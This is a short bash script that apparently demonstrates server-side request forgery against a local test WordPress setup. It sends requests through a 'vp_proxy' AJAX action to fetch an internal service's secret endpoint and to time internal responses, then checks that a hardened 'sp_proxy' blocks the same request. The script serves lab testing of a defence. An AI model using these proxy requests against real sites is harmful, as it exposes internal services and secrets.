#!/usr/bin/env bash
set -euo pipefail		# the command exits if any proceeding
				# piped argument fails
WP="http://localhost:8080"
echo "[*] Baseline public fetch via vulnerable proxy. Expected PNG bytes"
# get the header from the vuln proxy url when fetching the png
curl -s -o /dev/null -D - "$WP/wp-admin/admin-ajax.php?action=vp_proxy&url=http://static-assets:8000/sample.png" | grep -i 'HTTP/'

echo "[*] Fetch internal secrets via vuln proxy url (EXPECTED: secret JSON)"
curl -s "$WP/wp-admin/admin-ajax.php?action=vp_proxy&url=http://internal-api:5000/secret"
echo

echo "[*] Timing test (slow vs fast) via vuln proxy"
time curl -s -o dev/null "$WP/wp-admin/admin-ajax.php?action=vp_proxy&url=http://internal-api:5000/slow"
time curl -s -o dev/null "$WP/wp-admin/admin-ajax.php?action=vp_proxy&url=http://internal-api:5000/health"

echo "[*] After internal fetch, attempt to connect to the safe proxy (hardened; should be blocked)"
curl -i "$WP/wp-admin/admin-ajax.php?action=sp_proxy&url=http://internal-api:5000/secret" || true
